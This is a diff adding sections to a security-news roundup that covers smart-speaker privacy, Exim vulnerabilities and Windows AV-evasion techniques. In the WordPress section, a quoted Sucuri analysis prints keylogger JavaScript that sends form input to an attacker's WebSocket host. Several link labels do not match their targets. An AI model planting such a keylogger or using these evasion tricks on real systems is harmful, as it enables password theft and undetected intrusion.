@@ -10,10 +10,24 @@ Links and updates this week
 ===========================
 
 
+Maker's Schedule vs Manager's Schedule
+--------------------------------------
+
+From `Maker's Schedule, Manager's Schedule  <http://www.paulgraham.com/makersschedule.html>`_:
+
+  There are two types of schedule, which I'll call the manager's schedule and the maker's schedule. The manager's schedule is for bosses. It's embodied in the traditional appointment book, with each day cut into one hour intervals. You can block off several hours for a single task if you need to, but by default you change what you're doing every hour.
+
+  Most powerful people are on the manager's schedule. It's the schedule of command. But there's another way of using time that's common among people who make things, like programmers and writers. They generally prefer to use time in units of half a day at least. You can't write or program well in units of an hour. That's barely enough time to get started.
+
+  When you're operating on the maker's schedule, meetings are a disaster. A single meeting can blow a whole afternoon, by breaking it into two pieces each too small to do anything hard in.
+
+
 DNS leak test
 -------------
 
 See `DNS leak test.com <https://www.dnsleaktest.com/>`_ for information on testing for DNS leaks.
+
+Of course any pentester should be able to run a network scan for DNS leaks.
 
 
 Not getting hacked update
@@ -64,6 +78,87 @@ From the `Yale Privacy Lab - Surveillance Map <https://privacylab.yale.edu/surve
   Yale Privacy Lab is calling for transparency and public discussion concerning the steadily-increasing surveillance in our streets and near our homes, workplaces, and schools. This map is a starting point for conversation and action, focusing on Greater New Haven.
 
 
+Apple sharing your face
+-----------------------
+
+From `Apple is sharing your face with apps. That’s a new privacy worry. <https://www.washingtonpost.com/news/the-switch/wp/2017/11/30/apple-is-sharing-your-face-with-apps-thats-a-new-privacy-worry/?utm_term=.bed39f7897ce>`_:
+
+  Beyond a photo, the iPhone X’s front sensors scan 30,000 points to make a 3D model of your face. That’s how the iPhone X unlocks and makes animations that might have once required a Hollywood studio.
+
+  Now that a phone can scan your mug, what else might apps want to do with it? They could track your expressions to judge if you’re depressed. They could guess your gender, race and even sexuality. They might combine your face with other data to observe you in stores—or walking down the street.
+
+  Apps aren’t doing most of these things, yet. But is Apple doing enough to stop it? After I pressed executives this week, Apple made at least one change—retroactively requiring an app tapping into face data to publish a privacy policy.
+
+  Apple’s face tech sets some good precedents—and some bad ones. It won praise for storing the face data it uses to unlock the iPhone X securely on the phone, instead of sending it to its servers over the Internet.
+
+  Less noticed was how the iPhone lets other apps now tap into two eerie views from the so-called TrueDepth camera. There’s a wireframe representation of your face and a live read-out of 52 unique micro-movements in your eyelids, mouth and other features. Apps can store that data on their own computers.
+
+  To see for yourself, use an iPhone X to download an app called MeasureKit. It exposes the face data Apple makes available. The app’s maker, Rinat Khanov, tells me he’s already planning to add a feature that lets you export a model of your face so you can 3D print a mini-me.
+
+  And Apple’s rules say developers can’t sell face data, use it to identify anonymous people or use it for advertising. They’re also required to have privacy policies.
+
+  The bigger concern: “How realistic is it to expect Apple to adequately police this data?” Georgetown’s Garvey told me. Apple might spot violations from big apps like Facebook, but what about gazillions of smaller ones?
+
+  Then there’s a permission problem. Apps are supposed to make clear why they’re accessing your face and seek “conspicuous consent,” according to Apple’s policies. But when it comes time for you to tap OK, you get a pop-up that asks to “access the camera.” It doesn’t say, “HEY, I’M NOW GOING TO MAP YOUR EVERY TWITCH.”
+
+
+Go, Rust, Git, and  Mercurial
+-----------------------------
+
+Some follow-up on some topics we've talked about in the past: Git, Mercurial, Rust, and Go ...
+
+Git
+^^^
+
+Git is highly successful, even to the point that Microsoft is adapting Git: `Microsoft and GitHub team up to take Git virtual file system to macOS, Linux <https://arstechnica.com/gadgets/2017/11/microsoft-and-github-team-up-to-take-git-virtual-file-system-to-macos-linux/>`_.
+
+But git is hard, so take a look at `Think Like (a) Git - Git shouldn't be so hard to learn <http://think-like-a-git.net/>`_.
+
+
+Mercurial
+^^^^^^^^^
+
+Facebook uses and is extending Mercurial:
+
+* `Scaling Mercurial at Facebook <https://code.facebook.com/posts/218678814984400/scaling-mercurial-at-facebook/>`_
+
+* `facebookexperimental/mononoke <https://github.com/facebookexperimental/mononoke>`_ is a next-generation server for the `Mercurial source control system <https://www.mercurial-scm.org/>`_, meant to scale up to accepting thousands of commits every hour across millions of files. It is primarily written in the `Rust programming language <https://www.rust-lang.org/en-US/>`_.
+
+* `Facebook hg-experimental <https://bitbucket.org/facebook/hg-experimental>`_ repository has some Python extensions written in Rust
+
+
+Rust
+^^^^
+
+Which brings us to `Using Rust in Mercurial <https://www.mercurial-scm.org/wiki/OxidationPlan#>`_ illustrating another search for more secure coding by using Rust.
+
+To learn Rust see the free book `The Rust Programming Language <https://doc.rust-lang.org/stable/book/>`_ and to play with Rust online see the `Rust Playground <https://play.rust-lang.org/>`_.
+
+
+Go issues
+^^^^^^^^^
+
+Regarding go, `Go programming language invalid modular exponentiation result (Exp() in math/big pkg) <http://seclists.org/oss-sec/2017/q4/307>`_ shows an error in Go:
+
+  For an exponent of 1, big.Int.Exp returns the correct value only for a 0 recipient, and an off-by-one result for all pre-allocated recipients.
+
+And `Debugging an evil Go runtime bug <https://marcan.st/2017/12/debugging-an-evil-go-runtime-bug/>`_:
+
+  Go loves small stacks.
+
+  .. code-block:: text
+
+    TEXT runtime·walltime(SB),NOSPLIT,$16
+            // Be careful. We're calling a function with gcc calling convention here.
+            // We're guaranteed 128 bytes on entry, and we've taken 16, and the
+            // call uses another 8.
+            // That leaves 104 for the gettime code to use. Hope that's enough!
+
+  Turns out 104 bytes aren’t enough for everybody. Certainly not for my kernel.
+
+  It’s worth pointing out that the vDSO specification makes no mention of maximum stack usage guarantees, so this is squarely Go’s fault for making invalid assumptions.
+
+
 Classified AWS
 -------------------------------
 
@@ -90,6 +185,52 @@ From `Black Box, Red Disk: How Top Secret NSA and Army Data Leaked Online <https
 Also see `Researcher discovers classified Army intel app, data on open public AWS bucket <https://arstechnica.com/information-technology/2017/11/army-red-disk-intel-sharing-system-left-exposed-in-open-aws-data-store/>`_.
 
 
+Just say no to Amazon Echo, Google Home, ...
+--------------------------------------------
+
+
+Alexa, are you listening?
+^^^^^^^^^^^^^^^^^^^^^^^^^
+
+From `Alexa, are you listening? <https://labs.mwrinfosecurity.com/blog/alexa-are-you-listening>`_:
+
+  The Amazon Echo is vulnerable to a physical attack that allows an attacker to gain a root shell on the underlying Linux operating system and install malware without leaving physical evidence of tampering. Such malware could grant an attacker persistent remote access to the device, steal customer authentication tokens, and the ability to stream live microphone audio to remote services without altering the functionality of the device.
+
+  This vulnerability is due to two hardware design choices:
+
+  + Exposed debug pads on the base of the device
+
+  + Hardware configuration setting which allows the device to boot from an external SD Card
+
+  This vulnerability has been confirmed on the 2015 and 2016 edition of the Amazon Echo however the 2017 edition is not vulnerable to this physical attack. The mitigation implemented by Amazon was to join the +3V input pad with the MOSI/CMD pad somewhere on the main board, this effectively disables SPI communications with an external SD Card, preventing external booting. 
+
+
+Don't Buy Anyone an Echo
+^^^^^^^^^^^^^^^^^^^^^^^^
+
+From `Don't Buy Anyone an Echo <https://blog.ensilo.com/atombombing-a-code-injection-that-bypasses-current-security-solutions>`_:
+
+  Three years ago, we `said <https://gizmodo.com/amazons-echo-might-be-its-most-important-product-in-yea-1655513291>`_ the Echo was “the most innovative device Amazon’s made in years.” That’s still true. But you shouldn’t buy one. ... In fact, ignore any praise we’ve ever heaped onto smart speakers and voice-controlled assistants. They’re bad!
+
+  Let me make this point dreadfully clear, though: Your family members do not need an Amazon Echo or a Google Home or an Apple HomePod or whatever that one smart speaker that uses Cortana is called. And you don’t either. ... You probably think that having an always-on microphone in your home is fine, and furthermore, tech companies only record and store snippets of your most intimate conversations.
+
+  By buying a smart speaker, you’re effectively paying money to let a huge tech company surveil you. ... Amazon, Google, Apple, and others say that their devices aren’t spying on unsuspecting families. The only problem is that these gadgets are both hackable and prone to bugs. 
+
+  The same companies are less explicit about what they’re doing with all that data. They’re also vague about whether they might share voice recordings with developers in the future. Amazon, at least, `seems open to the idea <https://www.theverge.com/2017/7/12/15960596/amazon-alexa-echo-speaker-audio-recordings-developers-data>`_.
+
+  We do know that Amazon will hand over your Echo data if the gadget becomes involved in a homicide investigation. ... It remains unclear how government agencies like the FBI, CIA, and NSA are treating smart speakers, too. The FBI, for one, would neither confirm nor deny wiretapping Amazon Echo devices when Gizmodo asked the agency about it last year.
+
+  ... Anything that’s connected to the internet is potentially vulnerable to intrusions, but as a new category of devices, smart speakers are simply untested in the security arena. ... Not long after its launch, the Google Home Mini `experienced a bug <http://www.androidpolice.com/2017/10/10/google-nerfing-home-minis-mine-spied-everything-said-247/>`_ that led to the device recording everything happening in a technology reporter’s house for dozens of hours.
+
+From (the above) link `Amazon may give app developers access to Alexa audio recordings <https://www.theverge.com/2017/7/12/15960596/amazon-alexa-echo-speaker-audio-recordings-developers-data>`_:
+
+  Amazon is considering granting third-party app developers access to transcripts of audio recordings saved by Alexa-powered devices, according to a `report from The Information today <https://www.theinformation.com/facing-new-rivals-amazon-may-open-up-alexa-data-for-developers>`_.
+
+  The data is also kept in the event it’s request by law enforcement, however Amazon fought police over what it saw as an `overly broad request for audio logs on a murder suspect <https://www.theverge.com/2016/12/27/14089836/amazon-echo-privacy-criminal-investigation-data>`_ last year. (The company relented in April of this year and `handed over the logs <http://www.cnn.com/2017/03/07/tech/amazon-echo-alexa-bentonville-arkansas-murder-case/index.html>`_ when the suspect voluntarily said he was willing to provide them.)
+
+  Amazon does not hand this data over to developers, *The Information* says, because such a move would undermine Amazon’s commitment to user privacy. However, because Google, which makes the most popular Echo competitor currently on the market, does give developers access to this data, Amazon’s Echo and Alexa divisions feel they are at a disadvantage, the report states. Google did not immediately respond to a request for comment on its data-sharing policies for the Home speaker.
+
+
 macOS allows login as root
 --------------------------
 
@@ -105,7 +246,7 @@ Continuing on in the article, it was first posted on Nov 13, 2017:
 
   rather innocuously, to Apple's very own Developer Formums...in order to aid a user ...
 
-  However, the flaw only gained wider public attention, when Lemi Orhan Ergin (`@lemiorhan <https://twitter.com/lemiorhan>`_) posted a **`tweet <https://twitter.com/lemiorhan/status/935578694541770752>`_** stating that, "we noticed a *HUGE* security issue at MacOS High Sierra...":
+  However, the flaw only gained wider public attention, when Lemi Orhan Ergin (`@lemiorhan <https://twitter.com/lemiorhan>`_) posted a `tweet <https://twitter.com/lemiorhan/status/935578694541770752>`_ stating that, "we noticed a *HUGE* security issue at MacOS High Sierra...":
 
   Let's recap:
 
@@ -125,15 +266,23 @@ From `Apple to audit development processes after Mac bug discovered <https://www
 Exim RCE and DoS
 ----------------
 
-Note: for details of SMTP BDAT see `RFC 3030`_ SMTP Service Extensions for Transmission of Large and Binary MIME Messages.
+
+Exim usage and BDAT
+^^^^^^^^^^^^^^^^^^^
 
 Note: from `Mail (MX) Server Survey <http://www.securityspace.com/s_survey/data/man.201710/mxsurvey.html>`_ Exim ran 56.64% of the 1,016,147 servers that were able to be fingerprinted. So bugs are a big deal.
 
-There are 2 bugs resulting in 2 CVEs. From both `CVE-2017-16943 <https://nvd.nist.gov/vuln/detail/CVE-2017-16943>`_ and `CVE-2017-16944 <https://nvd.nist.gov/vuln/detail/CVE-2017-16944>`_:
+Note: for details of SMTP BDAT see `RFC 3030`_ SMTP Service Extensions for Transmission of Large and Binary MIME Messages.
+
+
+CVE-2017-16943 and CVE-2017-16944
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+There are 2 bugs resulting in 2 CVEs. Both `CVE-2017-16943 <https://nvd.nist.gov/vuln/detail/CVE-2017-16943>`_ and `CVE-2017-16944 <https://nvd.nist.gov/vuln/detail/CVE-2017-16944>`_ currently have the same description:
 
   The receive_msg function in receive.c in the SMTP daemon in Exim 4.88 and 4.89 allows remote attackers to cause a denial of service (infinite loop and stack exhaustion) via vectors involving BDAT commands and an improper check for a '.' character signifying the end of the content, related to the bdat_getc function.
 
-The first (RCE) bug was reported as `[exim-announce] Critical Exim Security Vulnerability: disable chunking <https://lists.exim.org/lurker/message/20171125.034842.d1d75cac.en.html>`_:
+The (RCE) bug was reported as `[exim-announce] Critical Exim Security Vulnerability: disable chunking <https://lists.exim.org/lurker/message/20171125.034842.d1d75cac.en.html>`_:
 
   A remote code execution vulnerability has been reported in Exim, with immediate public disclosure (we were given no private notice).
 
@@ -215,3 +364,195 @@ The second (DoS) bug was reported as `Bug 2201 - Exim handles BDAT data incorrec
     .
     BDAT 0
     ```
+
+
+Exim code
+^^^^^^^^^
+
+From `RCE in Exim reported <http://seclists.org/oss-sec/2017/q4/325>`_:
+
+  Chunking support was introduced with Exim 4.88; the current release is 4.89, 4.90 is in RC series now, it looks like a 2-line fix (written by Jeremy Harris) is probably right for the first issue.
+
+From `Exim Development Repository - Development Repositories <https://github.com/Exim/exim>`_:
+
+  Exim development is kept within a git (https://git-scm.com/) repository. The master repository is at git://git.exim.org/exim.git with a web interface giving change and source visibility at https://git.exim.org/exim.git
+
+  There is a secondary repository on github at https://github.com/Exim/exim managed by the Exim Organisation - however this may currently fall out of synchronisation with the main one.
+
+The original bug report was probably using Exim 4.89, so from `exim.git <https://git.exim.org/exim.git>`_ the tag `exim-4_89 tag <https://git.exim.org/exim.git/tag/6b1afefb1101885f2a13aeabe600aff68fc4afe5>`_, then `exim-4_89 commit <https://git.exim.org/exim.git/commit/38903fb5b864ee99904d035337c66891604d9678>`_, then `exim-4_89 tree <https://git.exim.org/exim.git/tree/38903fb5b864ee99904d035337c66891604d9678>`_ shows the code base for exim 4.89. Browse through :file:`src/src/` to the blob for `exim-4_89 receive.c <https://git.exim.org/exim.git/blob/38903fb5b864ee99904d035337c66891604d9678:/src/src/receive.c>`_ and  `exim-4_89 store.c <https://git.exim.org/exim.git/blob/38903fb5b864ee99904d035337c66891604d9678:/src/src/store.c>`_ whose code lines are the same as bug 2199.
+
+The code change for bug 2199 is at `Avoid release of store if there have been later allocations. Bug 2199 <https://git.exim.org/exim.git/blobdiff/ef9da2ee969c27824fcd5aed6a59ac4cd217587b..4e6ae6235c68de243b1c2419027472d7659aa2b4:/src/src/receive.c>`_.
+
+On GitHub, to see the changes from exim-4_87 to exim-4_88 can be see via https://github.com/Exim/exim/compare/exim-4_87...exim-4_88 or you can use git:
+
+.. code-block:: bash
+  :emphasize-lines: 1,3,5-6,8-9
+
+  git clone git://git.exim.org/exim.git
+  cd exim
+  git branch -a
+  # git fetch --all --tags --prune
+  git tag
+  git diff --name-status exim-4_87..exim-4_88
+  git diff --name-status master..exim-4_87
+  git diff master..exim-4_87 src/src/receive.c
+  git diff master..exim-4_87 src/src/store.c
+  git checkout tags/exim-4_87 -b buggy
+
+
+WordPress sites infected with keylogger
+---------------------------------------
+
+This `Cloudflare[.]Solutions Keylogger on Thousands of Infected WordPress Sites <https://blog.sucuri.net/2017/12/cloudflare-solutions-keylogger-on-thousands-of-infected-wordpress-sites.html>`_:
+
+  A few weeks ago, `we wrote <http://labs.sucuri.net/?note=2017-11-24>`_ about a massive WordPress infection that injected an obfuscated script pretending to be jQuery and Google Analytics. In reality, this script loaded a `CoinHive cryptocurrency miner <https://blog.sucuri.net/2017/09/hacked-websites-mine-crypocurrencies.html>`_ from a third-party server.
+
+  We also mentioned a post written back in April that described the `cloudflare.solutions <http://labs.sucuri.net/?note=2017-04-03>`_ malware, which came along with the cryptominers. At this moment, `PublcWWW reports <https://publicwww.com/websites/%22cloudflare.solutions%2Fajax%22/>`_ there are 5,482 sites infected with this malware. It seems that this evolving campaign is now adding keyloggers to the mix.
+
+  **Fake linter.js URLs Turn Into a Keylogger**
+
+  ... you realize that the cdnjs.cloudflare.com is just a red herring and the real payloads are those hexadecimal numbers after the question mark in the URLs. The script decodes them and injects the following result into web pages:
+
+  .. code-block:: javascript
+    :emphasize-lines: 1,3-4,6,9-12
+
+    function process_event(event) {
+        var result = JSON.stringify({
+            key: event.target.value,
+            element: event.target.id
+        });
+        socket.send(result);
+    }
+
+    var i_fields = document.getElementsByTagName('input');
+    for (var i = 0; i < i_fields.length; i++) {
+        i_fields[i].addEventListener('blur', process_event);
+    }
+
+  As you can see, it’s a **keylogger**. This script adds a handler to every **input** field on the websites to send its value to the attacker (**wss://cloudflare[.]solutions:8085/**) when a user leaves that field.
+
+  Given the keylogger functionality of this malware, you should consider all WordPress passwords compromised so the next mandatory step of the cleanup is changing the passwords (actually it is highly recommended after any site hack).
+
+
+Bypassing AV
+------------
+
+AVGater
+^^^^^^^
+
+From `#AVGater: Getting Local Admin by Abusing the Anti-Virus Quarantine <https://bogner.sh/2017/11/avgater-getting-local-admin-by-abusing-the-anti-virus-quarantine/>`_:
+
+  #AVGater can be used to restore a previously quarantined file to any arbitrary filesystem location. This is possible because the restore process is most often carried out by the privileged AV Windows user mode service. Hence, file system ACLs can be circumvented (as they don’t really count for the SYSTEM user). This type of issue is called a privileged file write vulnerability and can be used to place a malicious DLL anywhere on the system. The goal is to side load this library for a legitimate Windows servers by abusing the DLL Search Order ...
+
+  But there is still one very important question still unanswered: How is it possible to tamper with the restore process? The solution are NTFS directory junctions. They are basically symbolic links for directories that can be created by anyone with the help of `mklink <https://technet.microsoft.com/en-us/library/cc753194%28v=ws.11%29.aspx?f=255&MSPPError=-2147217396>`_.
+
+  By abusing NTFS directory junctions, the AV quarantine restore process can be manipulated, so that previously quarantined files can be written to arbitrary file system locations.
+
+From `How AV can open you to attacks that otherwise wouldn’t be possible <https://arstechnica.com/information-technology/2017/11/how-av-can-open-you-to-attacks-that-otherwise-wouldnt-be-possible/>`_:
+
+  Bogner said he developed a series of AVGater exploits during several assignments that called for him to penetrate deep inside customer networks. Using malicious phishing e-mails, he was able to infect employee PCs, but he still faced a significant challenge. Because company administrators set up the PCs to run with limited system privileges, Bogner's malware was unable to access the password database—known as the Security Account Manager—that stored credentials he needed to pivot onto the corporate network.
+
+  "With the help of AVGater, I gained local admin privileges," Bogner wrote in an e-mail.
+
+  As a general rule, people who aren't likely to be narrowly targeted in attacks are probably better off running Windows Defender or another name-brand AV engine. Journalists, lawyers, and activists, on the other hand, should weigh the benefits and risks on a case-by-case basis.
+
+
+Process Doppelgänging
+^^^^^^^^^^^^^^^^^^^^^
+
+From `"Process Doppelgänging" Attack Works on All Windows Versions <https://www.bleepingcomputer.com/news/security/-process-doppelg-nging-attack-works-on-all-windows-versions/>`_:
+
+  Research material on Process Doppelgänging will be published on the `Black Hat website <https://www.blackhat.com/eu-17/briefings.html#lost-in-transaction-process-doppelg%C3%A4nging>`_ in the following days.
+
+So we don't have a lot of detail right now. But continuing on from the Dec 7, 2017 article:
+
+  This new attack works on all Windows versions and researchers say it bypasses most of today's major security products.
+
+  Process Doppelgänging ... utilizes the Windows mechanism of `NTFS Transactions <https://msdn.microsoft.com/en-us/library/windows/desktop/aa363764>`_.
+
+From blackhat Europe 2017 Briefings - December 6 & 7 `Lost in Transaction: Process Doppelgänging <https://www.blackhat.com/eu-17/briefings.html#lost-in-transaction-process-doppelg%C3%A4nging>`_:
+
+  Doppelgänging works by utilizing two key distinct features together to mask the loading of a modified executable. By using NTFS transactions, we make changes to an executable file that will never actually be committed to disk. We will then use undocumented implementation details of the process loading mechanism to load our modified executable, but not before rolling back the changes we made to the executable. The result of this procedure is creating a process from the modified executable, while deployed security mechanisms remain in the dark.
+
+From `NTFS Transactions <https://msdn.microsoft.com/en-us/library/windows/desktop/aa363764>`_:
+
+  Most modern evasion techniques rely on complex memory manipulation in order to avoid AV/NGAV scan engines. Instead, we wanted to take advantage of the implementation of the Windows loader, and abuse it to load our code, while keeping it away from the prying eyes of security products. Moreover, the code will never be saved to any file on disk, making it invisible to most recording tools such as modern EDRs.
+
+  Microsoft strongly recommends developers utilize alternative means to achieve your application’s needs. Many scenarios that TxF was developed for can be achieved through simpler and more readily available techniques. Furthermore, TxF may not be available in future versions of Microsoft Windows. For more information, and alternatives to TxF, please see `Alternatives to using Transactional NTFS <https://msdn.microsoft.com/en-us/library/windows/desktop/hh802690>`_.
+
+  TxF can participate in distributed transactions that the Distributed Transaction Coordinator (DTC) coordinates, which allows you to use TxF for the following:
+
+  * Transactions that span multiple data stores, for example, a single transaction for file and SQL operations
+  * Transactions that span multiple computers, for example, a single transaction for file updates on multiple computers
+
+Back to `"Process Doppelgänging" Attack Works on All Windows Versions <https://www.bleepingcomputer.com/news/security/-process-doppelg-nging-attack-works-on-all-windows-versions/>`_:
+
+  Researchers sucessfully tested their attack on products from Kaspersky, Bitdefender, ESET, Symantec, McAfee, Windows Defender, AVG, Avast, Qihoo 360, and Panda. Furthermore, even advanced forensics tools such as Volatility will not detect it.
+
+  In their experiments, researchers used Process Doppelgänging to run Mimikatz, a known utility used for password-stealing operations, "in a stealthy way to avoid detection."
+
+  **The good news and the bad news**
+
+  The good news is that "there are a lot of technical challenges" in making Process Doppelgänging work, and attackers need to know "a lot of undocumented details on process creation."
+
+  The bad news is that the attack "cannot be patched since it exploits fundamental features and the core design of the process loading mechanism in Windows."
+
+  Process Doppelgänging now joins the list of new attack methods discovered in the past year that are hard to detect and mitigate for modern AVs, such as `Atom Bombing <https://blog.ensilo.com/atombombing-a-code-injection-that-bypasses-current-security-solutions>`_, `GhostHook <https://www.bleepingcomputer.com/news/security/new-ghosthook-attack-bypasses-windows-patchguard-protections/>`_, and `PROPagate <https://www.bleepingcomputer.com/news/security/researcher-details-new-windows-code-injection-technique-named-propagate/>`_.
+
+  Research material on Process Doppelgänging will be published on the Black Hat website in the following days.
+
+
+AtomBombing
+^^^^^^^^^^^
+
+From `New GhostHook Attack Bypasses Windows PatchGuard Protections <https://www.bleepingcomputer.com/news/security/new-ghosthook-attack-bypasses-windows-patchguard-protections/>`_:
+
+  Our research team has uncovered new way to leverage mechanisms of the underlying Windows operating system in order to inject malicious code. Threat actors can use this technique, which exists by design of the operating system, to bypass current security solutions that attempt to prevent infection. We named this technique AtomBombing based on the name of the underlying mechanism that this technique exploits.
+
+  The underlying Windows mechanism which AtomBombing exploits is called atom tables. These tables are provided by the operating system to allow applications to store and access data. These atom tables can also be used to share data between applications.
+
+  What we found is that a threat actor can write malicious code into an atom table and force a legitimate program to retrieve the malicious code from the table. We also found that the legitimate program, now containing the malicious code, can be manipulated to execute that code.
+
+  For the technology deep dive, please the researcher’s post here: https://breakingmalware.com/injection-techniques/atombombing-brand-new-code-injection-for-windows/
+
+  AtomBombing is performed just by using the underlying Windows mechanisms. There is no need to exploit operating system bugs or vulnerabilities.
+
+  Since the issue cannot be fixed, there is no notion of a patch for this. Thus, the direct mitigation answer would be to tech-dive into the API calls and monitor those for malicious activity.
+
+
+GhostHook
+^^^^^^^^^
+
+From `New GhostHook Attack Bypasses Windows PatchGuard Protections <https://www.bleepingcomputer.com/news/security/new-ghosthook-attack-bypasses-windows-patchguard-protections/>`_:
+
+  Security experts have discovered a method of bypassing Windows PatchGuard protections and hooking malicious code into the Windows kernel, which allows an attacker to plant rootkits on systems previously thought to be impregnable.
+
+  PatchGuard, known under its official name of Kernel Patch Protection (KPP), is a security feature for Windows 64-bit editions that prevents third-party code from patching the Windows kernel with additional routines.
+
+  Microsoft introduced PatchGuard in 2005, starting with Windows XP, and the feature has prevented most rootkits from working on 64-bit editions.
+
+  CyberArk says it contacted Microsoft about the GhostHook attack, but the OS maker declined to issue a security update. Microsoft said it might patch the issue during its regular bug fixing cycle, but would not treat GhostHook as a security flaw.
+
+  Microsoft justified its decision by saying that an attacker needs to have kernel-level access on an infected machine to perform a GhostHook attack. An attacker with kernel-level rights could perform many other malicious actions, and users should focus on preventing an attacker from gaining this much level of access in the first place.
+
+
+PROPagate
+^^^^^^^^^
+
+From `PROPagate – a new code injection trick <http://www.hexacorn.com/blog/2017/10/26/propagate-a-new-code-injection-trick/>`_:
+
+From `PROPagate – a new code injection trick – 64-bit and 32-bit <http://www.hexacorn.com/blog/2017/11/03/propagate-a-new-code-injection-trick-64-bit-and-32-bit/>`_:
+
+From `Researcher Details New Windows Code Injection Technique Named PROPagate <https://www.bleepingcomputer.com/news/security/researcher-details-new-windows-code-injection-technique-named-propagate/>`_:
+
+  A security researcher has discovered a new code injection technique that works on all recent Windows versions and allows miscreants to inject malicious code into other applications undetected.
+
+  Adam has discovered that he can abuse legitimate GUI window properties (UxSubclassInfo and CC32SubclassInfo) utilized internally by SetWindowSubclass function to load and execute malicious code inside other (legitimate) applications.
+
+  `In subsequent research <http://www.hexacorn.com/blog/2017/11/03/propagate-a-new-code-injection-trick-64-bit-and-32-bit/>`_ Adam published last Friday, the expert also discovered that PROPagate code injection attacks work on both 32-bit and 64-bit processes, with little modifications.
+
+  Adam made it clear that this is not a serious cause for concern when compared to other types of security bugs, such as remote code execution or escalation of privileges.
+
+  "This is an evasion technique," Adam told Bleeping Computer. "I didn't contact Microsoft because it's not an RCE or EoP and didn't consider it is worth reporting."
+
+  "To use the attack, one has to be already running some code on your system, i.e., it's already game over, as such, it has a limited scope," the expert added.
